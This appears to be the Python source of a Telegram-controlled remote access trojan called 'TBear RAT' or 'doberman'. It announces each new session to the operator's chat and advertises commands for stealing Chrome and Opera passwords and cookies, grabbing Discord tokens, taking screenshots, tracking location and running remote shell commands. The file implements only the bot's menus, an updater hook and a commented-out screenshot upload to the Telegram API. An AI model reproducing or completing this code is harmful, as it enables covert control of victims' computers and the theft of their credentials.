# ----------------------------------------------------------------------------------------------------------------------
# @Author: un1nsta11
# @Contact: un1nsta11.github.io
# @File:  
# @Directory: 
# @Project: doberman
# @Time: 1.05.24 15:32
# 2024 (c) Copyright
# ----------------------------------------------------------------------------------------------------------------------
import logging
import telebot
from telebot import types
import os
from logging import config
import json

logging.config.fileConfig(os.path.join(os.getcwd(), 'config', 'logconf.ini'))
logging = logging.getLogger('spider')

with open(os.path.join(os.getcwd(), 'config', 'config.json'), 'r') as f:
    conf = json.load(f)
bot_token = conf["token"]
chat_id = conf["id"]
bot = telebot.TeleBot(bot_token)


@bot.message_handler(commands=['start'])
def send_message(command):
    bot.send_message(chat_id, '' +
                     '\n\nTo know all commands: ' + '\n/commands ' + '\nTo know about TBear RAT: ' + '\n/help', reply_markup=keyboard())

def keyboard():
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button_1 = types.KeyboardButton('/commands')
    button_2 = types.KeyboardButton('/help')
    markup.add(button_1)
    markup.add(button_2)
    return markup


@bot.message_handler(commands=['help'])
def send_message(command):
    bot.send_message(chat_id, 'RAT v1.0' + '\n\n@2024')



@bot.message_handler(commands=['commands'])
def send_message(command):
    bot.send_message(chat_id, 'commands: \n\n /screen - screenshot \n /info - info about user \n /location - location on a map \n /kill_process - kill the process (process.exe)' +
                    '\n /reboot - reboot pc \n /shutdown - shutdown pc \n /pwd - know current directory \n /passwords_chrome - chromepasswords \n /passwords_opera - operapasswords' +
                    '\n /cockies_chrome - chrome cockies' + '\n /cockies_opera - opera cockies' + '\n /get_discord - get token of Discord session' +
                    '\n /cmd command - execute command in CMD  \n /open_url - open link \n /ls - all files and folders in directory' +
                    '\n /cd - move to folder \n /download - download file \n /rm_dir - delete folder' +
                    '\n\n /help - о RAT')


@bot.message_handler(commands=['update'])
def send_message(command):
    bot.send_message(chat_id, 'Updating... Please, wait...')
    os.startfile("C:\\doberman\\updater\\updater.bat")
    # TODO: print version
    if os.path.exists("version.txt"):
        with open("version.txt", "r") as f:
            version = f.read()
        bot.send_message(chat_id, f"Updated to version {version}")


@bot.message_handler(commands=['screen'])
def send_screen(command) :
    bot.send_message(chat_id, 'Wait...')
    # screen = ImageGrab.grab()
    # screen.save(os.getenv('APPDATA') + '\\Sreenshot.jpg')
    # screen = open(os.getenv('APPDATA') + '\\Sreenshot.jpg', 'rb')
    # files = {'photo': screen}
    # requests.post('https://api.telegram.org/bot' + bot_token + '/sendPhoto?chat_id=' + chat_id , files=files)



if __name__ == '__main__':
    bot.send_message(chat_id=chat_id, text="[ALERT] Session Started")
    bot.polling()
